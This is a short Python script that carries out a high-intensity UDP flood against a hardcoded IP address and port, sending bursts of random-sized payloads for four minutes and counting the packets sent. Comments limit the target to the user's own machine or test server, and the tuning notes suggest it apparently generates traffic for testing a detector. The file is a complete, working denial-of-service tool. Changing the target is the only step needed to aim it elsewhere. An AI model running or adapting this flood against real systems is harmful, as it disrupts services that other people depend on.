import socket
import random
import time

# ⚠️ TARGET: ONLY YOUR OWN MACHINE / TEST SERVER
TARGET_IP = "10.71.36.211"   # your laptop IP (from ipconfig)
TARGET_PORT = 5173           # MUST be an open port (Node / Flask / etc.)

# 🔥 IMPORTANT TUNING (DO NOT LOWER)
DURATION_SECONDS = 240        # long flow → higher confidence
SOURCE_PORT = 80          # fixed source port → single aggressive flow

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)



print("🔥 Starting HIGH-INTENSITY UDP Flood")
print(f"Target: {TARGET_IP}:{TARGET_PORT}")
print(f"Source Port: {SOURCE_PORT}")
print(f"Duration: {DURATION_SECONDS} seconds")

start_time = time.time()
sent_packets = 0

while time.time() - start_time < DURATION_SECONDS:
    # 🔥 BURST MODE (Windows-friendly)
    for _ in range(200):
        payload = random._urandom(
            random.choice([512, 1024, 2048, 4096])  # increase packet length variance
        )
        sock.sendto(payload, (TARGET_IP, TARGET_PORT))
        sent_packets += 1

print(f"✅ Attack finished. Packets sent: {sent_packets}")
